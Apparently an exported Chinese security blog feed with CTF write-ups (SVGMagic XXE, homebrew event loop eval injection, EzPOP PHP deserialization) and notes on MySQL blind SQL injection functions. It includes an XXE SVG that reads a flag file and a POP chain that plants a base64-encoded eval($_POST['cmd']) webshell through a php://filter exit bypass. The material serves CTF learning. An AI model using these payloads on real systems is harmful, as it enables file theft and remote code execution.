<p>去userIndex里面查看一下这里的变量是img_file<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210727111621.png" alt="img" style="zoom:67%;"><br>理一下思路，我们可以使用extract需要变量覆盖，传入的值是也是可控的，用request，所以构造payload,首先我们得先到user这个路由这里</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210727112349.png" alt="img" style="zoom: 50%;">
不过对于这个传值还是想研究一下，所以在phpstorm里面断点调试一下
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210727112758.png" alt="img" style="zoom:67%;">
为什么要是img，因为后面是这个变量的内容会回显在网页上，也就是这个图片

<h2 id="BSidesCF-2019-SVGMagic"><a href="#BSidesCF-2019-SVGMagic" class="headerlink" title="[BSidesCF 2019]SVGMagic"></a>[BSidesCF 2019]SVGMagic</h2><p>题目说将svg转为png，svg是用xml格式定义的图像，推测是xxe注入<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210727142603.png" alt="img" style="zoom:67%;"></p>
<p>在本地先编写一个svg文件</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">note</span>[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///proc/self/cwd/flag.txt&quot;</span> &gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">width</span>=<span class="string">&quot;2000&quot;</span> <span class="attr">height</span>=<span class="string">&quot;100&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">text</span> <span class="attr">x</span>=<span class="string">&quot;100&quot;</span> <span class="attr">y</span>=<span class="string">&quot;100&quot;</span>&gt;</span><span class="symbol">&amp;file;</span><span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>然后将其上传即可<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210727150556.png" alt="img" style="zoom:67%;"></p>
<h2 id="DDCTF-2019-homebrew-event-loop"><a href="#DDCTF-2019-homebrew-event-loop" class="headerlink" title="[DDCTF 2019]homebrew event loop"></a>[DDCTF 2019]homebrew event loop</h2><p>python源码审计</p>
<p>将event写入session函数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">trigger_event</span>(<span class="params">event</span>):</span></span><br><span class="line">    session[<span class="string">&#x27;log&#x27;</span>].append(event)</span><br><span class="line">    <span class="keyword">if</span> len(session[<span class="string">&#x27;log&#x27;</span>]) &gt; <span class="number">5</span>:</span><br><span class="line">        session[<span class="string">&#x27;log&#x27;</span>] = session[<span class="string">&#x27;log&#x27;</span>][<span class="number">-5</span>:]</span><br><span class="line">    <span class="keyword">if</span> type(event) == type([]):</span><br><span class="line">        request.event_queue += event</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        request.event_queue.append(event)</span><br></pre></td></tr></table></figure>

<p>有三个points，0个num_items，但是不清楚有什么是写在session中的<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210727153715.png" alt="img"></p>
<p>这里num_items要大于等于5 flag就会被写入session<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210727154134.png" alt="img" style="zoom: 50%;"></p>
<p>如果我们可以先买钻石，然后让flag被写入session中，然后再扣费，那就可以实现num_items大于等于5，可以看到这里有一个eval函数：<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210727160247.png" alt="img" style="zoom:67%;"></p>
<p>因为eval函数后面的参数可控所以</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">action:trigger_event%23;action:buy;5%23action:get_flag;</span><br></pre></td></tr></table></figure>

<p>然后使用flask-session-manager-master解密session<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210727162533.png" alt="img" style="zoom:67%;"><br>即可获得flag<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210727162532.png" alt="img" style="zoom:67%;"></p>
]]></content>
  </entry>
  <entry>
    <title>buu25</title>
    <url>/2021/07/27/buu25/</url>
    <content><![CDATA[<h2 id="EIS-2019-EzPOP"><a href="#EIS-2019-EzPOP" class="headerlink" title="[EIS 2019]EzPOP"></a>[EIS 2019]EzPOP</h2><p>找到一个危险函数根据此函数往前看看是否能传值进去这里有个exit()，好像不会执行后面data的内容，这里待会需要想办法绕过，但是首先需要弄懂将值传入的链<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210728090038.png" alt="img" style="zoom:50%;"></p>
<p>data首先可能会经过一个压缩的操作为了不让data发生改变，我们就需要将data_compress设为0<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210728101551.png" alt="img" style="zoom:67%;"></p>
<p>接下来会经过一个serialize的函数操作，如果为数字，那么就会返回string的data，那我们可以先让我们data会string类型，后面因为serialize()可以看成是一个函数的执行，并且serialize可以由我们直接赋值，这里可以使用strval函数。<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210728101747.png" alt="img" style="zoom: 67%;"><br>向上是set函数没传入这些值，其中value就是对应我们后面的data<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210728103701.png" alt="img" style="zoom:67%;"></p>
<p>往上对应来自于class A中的content中，而这里的store需要赋值为classB中，不然找不到set方法<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210728103821.png" alt="img" style="zoom:50%;"></p>
<p>在往上看到来自于cleanContents中的cache，这个在前面的定义中没有看到，所以我们可以直接自己定义一下这个变量，看到下面还有一个json_encode为了防止被json_encode，我们这里还需要将complete设置为0这样子的话就可以避免被json_encode<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210728104016.png" alt="img" style="zoom:67%;"></p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210728104856.png" alt="img" style="zoom: 50%;">

<p>最后再向上来到construct这里，这里有对store进行赋值，这里需要赋值为new B<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210728111306.png" alt="img" style="zoom:67%;"></p>
<p>现在整理一下编写pop链条：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $store;</span><br><span class="line">    <span class="keyword">public</span> $key=<span class="string">&quot;a.php&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $expire;</span><br><span class="line">    <span class="keyword">public</span> $cache;</span><br><span class="line">    <span class="keyword">public</span> $complete;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$store</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;store=$store;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $options;</span><br><span class="line">&#125;</span><br><span class="line">$b=<span class="keyword">new</span> B();</span><br><span class="line">$b-&gt;options=<span class="keyword">array</span>(<span class="string">&#x27;data_compress&#x27;</span>=&gt;<span class="number">0</span>,<span class="string">&#x27;expire&#x27;</span>=&gt;<span class="number">0</span>,<span class="string">&#x27;serialize&#x27;</span>=&gt;<span class="string">&#x27;strval&#x27;</span>);</span><br><span class="line">$a=<span class="keyword">new</span> A($b);</span><br><span class="line">$a-&gt;cache=<span class="keyword">array</span>(<span class="number">1</span>=&gt;<span class="keyword">array</span>(<span class="number">1</span>=&gt;<span class="number">1</span>));</span><br><span class="line">$a-&gt;complete=<span class="number">0</span>;</span><br><span class="line">$a-&gt;key=<span class="number">1</span>;</span><br><span class="line">$a-&gt;expire=<span class="literal">null</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>现在的难点在于我们写入的内容前面有一个exit()这样的话，我们写入的内容将不会被执行，参考<br><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">https://www.leavesongs.com/PENETRATION/php-filter-magic.html</a><br>这里介绍的方法是这样的：先使用php://filter/wtrite=convert.base64.decode/resource=./uploads/伪协议，对原本文件中的内容进行base64编码后的读取，除掉那些&lt;?的特殊字符，我们只会对phpexit进行base64编码，我们传入的内容也需要是base64加密，但是我们可以多传入几个字符，打乱前面的加密<br><strong>base64加密方式：</strong><br>第一步，将待转换的字符串每三个字节分为一组，每个字节占8bit，那么共有24个二进制位。<br>第二步，将上面的24个二进制位每6个一组，共分为4组。<br>第三步，在每组前面添加两个0，每组由6个变为8个二进制位，总共32个二进制位，即四个字节。<br>第四步，根据Base64编码对照表（见下图）获得对应的值。反过来，base64解码时，一定是4个有效字节为一组进行解码</p>
<p>所以说这里要跟踪一下content传入的值，可以发现最终传入的值为第一个数组的键值，以及嵌套后的数组的键值<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210729164850.png" alt="img" style="zoom:67%;"><br>拼接以后即变成，因为接下来由于我们使用的伪协议的decode打开，所以前面这些将被base64解密回去，变成乱码 exit就消失了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">phpexit111 这里是一句话木马</span><br></pre></td></tr></table></figure>

<p>接下来写一下pop链：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $store;</span><br><span class="line">    <span class="keyword">public</span> $key=<span class="string">&quot;a.php&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $expire;</span><br><span class="line">    <span class="keyword">public</span> $cache;</span><br><span class="line">    <span class="keyword">public</span> $complete;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$store</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;store=$store;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $options;</span><br><span class="line">&#125;</span><br><span class="line">$b=<span class="keyword">new</span> B();</span><br><span class="line">$b-&gt;options=<span class="keyword">array</span>(<span class="string">&#x27;data_compress&#x27;</span>=&gt;<span class="number">0</span>,<span class="string">&#x27;expire&#x27;</span>=&gt;<span class="number">0</span>,<span class="string">&#x27;serialize&#x27;</span>=&gt;<span class="string">&#x27;strval&#x27;</span>,<span class="string">&#x27;prefix&#x27;</span>=&gt;<span class="string">&#x27;php://filter/write=convert.base64-decode/resource=./uploads/&#x27;</span>);</span><br><span class="line">$a=<span class="keyword">new</span> A($b);</span><br><span class="line">$a-&gt;cache=<span class="keyword">array</span>(<span class="number">111</span>=&gt;<span class="keyword">array</span>(<span class="string">&#x27;path&#x27;</span>=&gt;<span class="string">&quot;PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTs/PmFhYWFh&quot;</span>));</span><br><span class="line">$a-&gt;complete=<span class="number">1</span>;</span><br><span class="line">$a-&gt;key=<span class="string">&#x27;shell.php&#x27;</span>;</span><br><span class="line">$a-&gt;expire=<span class="literal">null</span>;</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br></pre></td></tr></table></figure>

<h3 id="小结："><a href="#小结：" class="headerlink" title="小结："></a>小结：</h3><p>这道题的坑点还挺多的<br>1.存在许多可能改变data的函数，但是都可以绕过<br>2.传入的数组需要为双重数组，具体是为什么可以在phpstorm中调试一下，并且我们的内容的键名还必须是他要求的那几个才会被识别进入content<br>3.exit的绕过需要了解base64的加密方式，然后后面的payload，在我们传入的时候后面需要再添加几个字母来补齐，防止前面的内容在解密的时候被吃掉</p>
]]></content>
  </entry>
  <entry>
    <title>sql盲注深入学习</title>
    <url>/2021/07/29/sql%E7%9B%B2%E6%B3%A8%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h2 id="sql盲注"><a href="#sql盲注" class="headerlink" title="sql盲注"></a>sql盲注</h2><h3 id="字符串截取问题"><a href="#字符串截取问题" class="headerlink" title="字符串截取问题"></a>字符串截取问题</h3><h4 id="1-substr-substring"><a href="#1-substr-substring" class="headerlink" title="1.substr()/substring()"></a>1.substr()/substring()</h4><p><strong>语法</strong>：<code>substr(str,pos)</code>，截取从pos位置开始到最后的所有str字符串</p>
<p>​            <code>substr(str，pos,len)</code><br>​            <code>substr(str from pos for len)</code><br>​            <code>substr(str from pos)</code></p>
<p><strong>两种等价形式</strong>：</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210729084755.png" alt="img" style="zoom: 50%;">

<h4 id="2-mid"><a href="#2-mid" class="headerlink" title="2.mid()"></a>2.mid()</h4><p>sql mid()函数用遇得到一个字符串的一部分，这个函数被MYSQL支持，但不被MS SQL Server 和Oracle支持。在SQL Server、Oracle数据库中，我们可以使用SQLsubstring或者sql substr函数作为替代<br>在mysql中和substr基本一样<br><strong>mid必须要三个参数</strong><br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210729085244.png" alt="img" style="zoom:67%;"></p>
<h4 id="3-right-ascii"><a href="#3-right-ascii" class="headerlink" title="3.right+ascii"></a>3.right+ascii</h4><p><strong>语法：</strong><code>ascii(right(str,pos))</code></p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210729085921.png" alt="img" style="zoom:67%;">

<h3 id="比较问题"><a href="#比较问题" class="headerlink" title="比较问题"></a>比较问题</h3><h4 id="1-等于"><a href="#1-等于" class="headerlink" title="1.等于"></a>1.等于</h4><h4 id="2-大于小于"><a href="#2-大于小于" class="headerlink" title="2.大于小于"></a>2.大于小于</h4><h4 id="3-like"><a href="#3-like" class="headerlink" title="3.like"></a>3.like</h4><p>sql中like自居使用百分号%字符来表示任意字符，类似于unix或正则表达式中的星号*。<br>如果没有使用百分号%,like字句与等号=的效果是一样的<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210729090948.png" alt="img" style="zoom:50%;"></p>
<h4 id="4-正则表达式regexp-rlike"><a href="#4-正则表达式regexp-rlike" class="headerlink" title="4.正则表达式regexp rlike"></a>4.正则表达式regexp rlike</h4><p><strong>语法</strong>：<code>regexp &quot;^str&quot;</code> </p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210729091454.png" alt="img" style="zoom:67%;">

<p><strong>regexp和rlike是不区分大小写的，需要大小写敏感要加上binary关键字</strong><br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210729092357.png" alt="img" style="zoom:67%;"></p>
<h4 id="5-between"><a href="#5-between" class="headerlink" title="5.between"></a>5.between</h4><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210729093050.png" alt="img" style="zoom:67%;">

<h4 id="6-in"><a href="#6-in" class="headerlink" title="6.in"></a>6.in</h4><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210729100242.png" alt="img" style="zoom:67%;">

<p><strong>也是大小写不敏感，字符和数字都可用，也有not in</strong></p>
<h4 id="7-AND逻辑与运算符"><a href="#7-AND逻辑与运算符" class="headerlink" title="7.AND逻辑与运算符"></a>7.AND逻辑与运算符</h4><p>1和真与还是真<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210729101041.png" alt="img" style="zoom:50%;"><br>下面的逻辑运算的都一样</p>
<h4 id="8-比较-or逻辑运算符"><a href="#8-比较-or逻辑运算符" class="headerlink" title="8.比较 or逻辑运算符"></a>8.比较 or逻辑运算符</h4><h4 id="9-异或运算符"><a href="#9-异或运算符" class="headerlink" title="9.异或运算符"></a>9.异或运算符</h4><h4 id="10-order-by比较盲注"><a href="#10-order-by比较盲注" class="headerlink" title="10.order by比较盲注"></a>10.order by比较盲注</h4><p><strong>语句：</strong><br>select x union select yzk order by 1; 如果x&lt;y那么排序的第一个会是x，如果x&gt;y那么排序第一个是y，更改的那一瞬间就会发生改变，</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210729101744.png" alt="img" style="zoom:67%;">
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210729102803.png" alt="img" style="zoom:67%;">

<p>图中表箭头的是可以修改的可以发现布尔值更改的前一个就是真的<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210729103136.png" alt="img"></p>
<h4 id="11-case"><a href="#11-case" class="headerlink" title="11.case"></a>11.case</h4><p><code>case exp1 when exp2 then exp3 else exp4 end;</code></p>
<p>这个语句的意思是：if exp1==exp2: return exp3<br>else return exp4</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210729110429.png" alt="img" style="zoom:67%;">

<h4 id="12-if"><a href="#12-if" class="headerlink" title="12.if"></a>12.if</h4><h4 id="13-trim"><a href="#13-trim" class="headerlink" title="13.trim()"></a>13.trim()</h4><p>trim():删除前后空格、rtrim():删除字符串结尾空格、ltrim():删除字符串起始空格<br><strong>语法：</strong>trim(both/leading/tring 目标字符串 from 源字符串)<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210729142333.png" alt="img" style="zoom:50%;"><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210729142334.png" alt="img" style="zoom:67%;"></p>
<p><strong>利用：</strong><br>可以发现有不一样的回显</p>
<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210729143024.png" alt="img"></p>
<p>写成比较语句如下：<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210729143234.png" alt="img"></p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210729143638.png" alt="img" style="zoom:67%;">

<p>如果=号用regexp替代 那么正确的字符一定在regexp前面</p>
<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210729144338.png" alt="img"><br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210729144416.png" alt="img" style="zoom:67%;"><br>所以应该是正确的那个在后面</p>
<h4 id="14-insert"><a href="#14-insert" class="headerlink" title="14.insert()"></a>14.insert()</h4><p><strong>insert(字符串，起始长度，长度，替换为什么)</strong></p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210729150500.png" alt="img" style="zoom:67%;">

<p>这样就可以按位截取字符</p>
]]></content>
  </entry>
</search>
